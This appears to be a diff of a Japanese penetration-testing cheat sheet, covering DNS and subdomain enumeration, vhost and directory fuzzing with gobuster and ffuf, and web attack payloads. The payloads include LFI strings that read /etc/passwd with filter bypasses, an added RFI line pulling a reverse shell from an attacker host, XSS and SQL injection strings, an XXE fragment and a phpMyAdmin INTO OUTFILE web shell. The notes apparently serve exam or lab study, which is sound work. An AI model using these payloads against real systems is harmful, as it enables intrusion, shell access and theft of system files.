@@ -215,8 +215,8 @@ DNS列挙スクリプト。
 2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
 ```
 - -d...ドメイン名の指定
-- -t...実行する列挙の種類(1つ目はゾーン転送)
-- -t...実行する列挙の種類(2つ目はブルートフォース)
+- -t axfr...ゾーン転送
+- -t brt...ブルートフォース
 - -D...サブドメイン文字列を含むワードリストファイルの指定
 
 #### DNSmap
@@ -242,6 +242,18 @@ IP address #1: 10.10.10.13
 DNSReconとは異なった出力をするDNS列挙ツール。
 ```
 kali@kali:~$ dnsenum zonetransfer.me
+```
+
+#### OSINT
+```
+# 検索エンジンを利用した手動列挙
+site:*.test.com,
+```
+
+Sublist3r(自動列挙ツール):  
+https://github.com/aboul3la/Sublist3r
+```
+./sublist3r.py -d test.com
 ```
 
 ## HTTP(80)
@@ -287,16 +299,16 @@ gobuster dns -d test.com -w subdomains-top1mil-5000.txt -i
 #### Gobuster(Vhostモード)
 組織が複数のドメイン名を1代のサーバーでホストしている仮想ホストを見つけることが可能。
 ```
-gobuster vhost -u http://10.10.10.1/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt
+gobuster vhost -u http://test.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt
 ```
 
 ### ffuf
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u http://website.com/ -H “Host: FUZZ.website.com”
-*単語の量でフィルタリング
+# 単語の量でフィルタリング
 ffuf -w sublists.txt -u http://website.com/ -H “Host: FUZZ.website.com” -fw 3913
 ```
-- -fw...単語の量でフィルタリング
+- -fw...単語の量でフィルタリング(一つ目のコマンドで表示された最も多いsizeの値を指定)
 - -fl...行数でフィルタリング
 - -fs...応答のサイズでフィルタリング
 - -fc...ステータスコードでフィルタリング
@@ -320,7 +332,7 @@ gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.
 - -w...wordlistの指定
 - -o...ファイル出力
 - -x...拡張子指定
-- -k...Skip SSL
+- -k...SSLをスキップ
 - -s...ステータスコードの指定
 
 #### ffuf
@@ -397,7 +409,8 @@ HTTPリクエストをBurpから直接送信することで、繰り返しHTTP�
 HTTPレスポンスの改ざんが可能。  
 これを利用することで、ステータスコード「302 Found」などで目的のページにたどり着く前に移動させられる際に、「200 Found」に変更してやることで目的のページへたどり着くことが可能。
 
-### LFI
+### ディレクトリトラバーサル, LFI(ローカルファイルインクルード)
+file_get_contents関数の不備
 ```
 http://<url>/script.php?page=../../../../../../../../etc/passwd
 http://<url>/script.php?page=../../../../../../../../etc/hosts
@@ -405,8 +418,9 @@ http://<url>/script.php?page=../../../../../../../../etc/hosts
 
 Examples: 
 ```
-http://example.com/index.php?page=etc/passwd
-http://example.com/index.php?page=etc/passwd%00
+http://example.com/index.php?page=/etc/passwd
+# /etc/passwdというキーワードがフィルタリングされている場合
+http://example.com/index.php?page=/etc/passwd%00
 http://example.com/index.php?page=../../etc/passwd
 http://example.com/index.php?page=%252e%252e%252f
 http://example.com/index.php?page=....//....//etc/passwd
@@ -434,6 +448,12 @@ Windows
 /windows/system32/drivers/etc/hosts
 /windows/repair/S
 ```
+
+### RFI
+allow_url_fopenオプションがONになっている場合に有効。
+```
+http://<Target IP>/<file>.php?file=http://<Attacker IP>/rs.php
+```
 ### XSS(クロスサイトスクリプティング)
 ```
 <script>alert(1);</script>
@@ -456,7 +476,6 @@ admin'/*
 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
 ```
 #### UNION injection
-
 #### SQLインジェクション→reverse shell
 
 
@@ -480,6 +499,8 @@ sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; 
 		<reward>&xxe;</reward>
 		</bugreport>
 ```
+
+### SSRF(サーバサイドリクエストフォージェリ)
 
 ### SSTI(サーバサイドテンプレートインジェクション)
 ![](./image/2021-04-14-15-23-34.png)
@@ -542,6 +563,9 @@ INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
 http://test.com/phpMyAdmin/cmd.php?cmd=ls
 ```
 
+### Wappalyzer
+Wappalyzerは、フレームワーク、コンテンツ管理システム(CMS)などのWebサイトが使用しているテクノロジーを特定するのに役立つオンラインツールおよびブラウザー拡張機能。バージョン番号も検索する。  
+https://www.wappalyzer.com/
 ### exiftool
 ・画像情報の表示
 ```
